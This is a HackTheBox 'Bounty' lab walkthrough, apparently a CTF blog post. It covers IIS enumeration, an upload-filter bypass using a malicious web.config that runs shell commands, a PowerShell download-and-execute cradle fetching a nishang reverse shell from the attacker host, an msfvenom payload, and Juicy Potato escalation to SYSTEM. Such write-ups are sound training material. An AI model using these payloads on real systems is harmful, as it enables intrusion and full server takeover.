---
title: HackTheBox - Bounty
date: 2021-08-14 19:08:40 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [Microsoft IIS, gobuster, Burp Intruder, web.config, RCE, nishang, powershell, SeImpersonatePrivilege, msfvenom, Juicy Potato, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/bounty/Bounty.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Bounty-full-port-scan.txt 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.11s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 80 (Microsoft-IIS/7.5)

![](/assets/img/htb/machines/windows/easy/bounty/80.png)

#### `gobuster`

```bash
$ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt,.aspx

=====================================================
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.93/aspnet_client/]
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
=====================================================
```

![](/assets/img/htb/machines/windows/easy/bounty/transfer.png)

After trying to upload a file with the `.aspx` extension, we encounter this error message:

![](/assets/img/htb/machines/windows/easy/bounty/invalid_file.png)

However, if we just change the extension to `.jpg`, the file will be successfully uploaded into the `/uploadedfiles` folder:

![](/assets/img/htb/machines/windows/easy/bounty/uploaded_successfully.png)

![](/assets/img/htb/machines/windows/easy/bounty/errors.png)

#### Burp Intruder

In order to figure out which extensions are allowed on this web server, we'll be using **Burp Intruder**. Here are the steps:

1. Enable [FoxyProxy](https://addons.mozilla.org/fr/firefox/addon/foxyproxy-standard/) (or install it if you don't)
2. Run **Burp** and ensure **Intercept is on** 
3. Upload a file with the `.jpg` extension
4. Go to the Proxy Tab and send the **HTTP request** to the **Intruder**

![](/assets/img/htb/machines/windows/easy/bounty/send_intruder.png)

5. Go to to the **Positions** tab, click on `Clear`, then select the `.jpg` and click twice on `Add` to append payload markers. Then you can write whatever you want between them:

![](/assets/img/htb/machines/windows/easy/bounty/payload_positions.png)

> In the example above, I forgot to remove the dot before the `§EXTENSION§`

6. Everything between these symbols will be replaced by our payload list.

![](/assets/img/htb/machines/windows/easy/bounty/load.png)

I used `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt`:

![](/assets/img/htb/machines/windows/easy/bounty/raft.png)

7. Make sure to uncheck `URL encode` and click on `Start attack`:

![](/assets/img/htb/machines/windows/easy/bounty/url_encode.png)

![](/assets/img/htb/machines/windows/easy/bounty/start.png)

As we can see in the screenshot below, extension returning HTTP response with a length of 1350 are accepted by the web server.  

![](/assets/img/htb/machines/windows/easy/bounty/diff.png)

After looking for "IIS 7 .config reverse shell", we can find two guided articles on how to get remote code extension by uploading `web.config` file: 

1. [Hacktricks - Execute .config files](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services#execute-config-files)
2. [Uploading web.config for Fun and Profit 2](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/)

![](/assets/img/htb/machines/windows/easy/bounty/search.png)

Uploading this file results in running ASP code on the target server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

![](/assets/img/htb/machines/windows/easy/bounty/3.png)

## Exploitation

If we replace the content of `web.config` by the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
Response.write("<!-"&"-")
%>
-->
```

We get the result of the `whoami` command:

![](/assets/img/htb/machines/windows/easy/bounty/merlin.png)


Okay now let's upload a reverse shell script (via [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)) and execute it from the web server:

```bash
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
$ echo "" >> shell.ps1 
$ echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 1234" >> shell.ps1 
```

- Run a listener with `rlwrap nc -lnvp 1234` as well as a web server via `python3 -m http.server 80`.

- Replace the `Set cmd` variable in the `web.config` file by this one:

```xml
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell.ps1')")
```

Upload the new `web.config` file and open it from your web browser / or by using `curl` and we got a shell:

![](/assets/img/htb/machines/windows/easy/bounty/reverse_shell.png)

## Privesc

If we take a look at our privileges, we can see that `SeImpersonatePrivilege` is enabled so we probably can run [**Juicy Potato**](https://github.com/ohpe/juicy-potato) exploit:

```cmd
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

This privilege is designed to allow a service to impersonate other users on the system. Juicy Potato exploits the way Microsoft handles tokens in order to escalate local privileges to **SYSTEM**.

We can get the executable from the [releases page](https://github.com/ohpe/juicy-potato/releases) and upload it to the target web server:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/JuicyPotato.exe',"c:\Windows\System32\spool\drivers\color\JuicyPotato.exe")
```

![](/assets/img/htb/machines/windows/easy/bounty/juice.png)


In order to use this exploit, we need a program to launch. We will be using a reverse shell executable generated via `msfvenom`:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f exe -o privesc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: privesc.exe
```

Then we transfer it to the target machine:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/privesc.exe',"c:\Windows\System32\spool\drivers\color\privesc.exe")
```

Finally we can execute it and get a shell as **SYSTEM**:

```powershell
PS C:\Windows\System32\spool\drivers\color> .\JuicyPotato.exe -l 1337 -p privesc.exe -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

![](/assets/img/htb/machines/windows/easy/bounty/system.png)

___

## Useful links

- [Hacktricks - Execute .config files](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services#execute-config-files)
- [Uploading web.config for Fun and Profit 2](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/)
- [THM - Burp Suite](https://tryhackme.com/room/rpburpsuite)
- [C2 server Merlin](https://github.com/Ne0nd0g/merlin)
- [nishang - `Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- [Juicy Potato](https://github.com/ohpe/juicy-potato)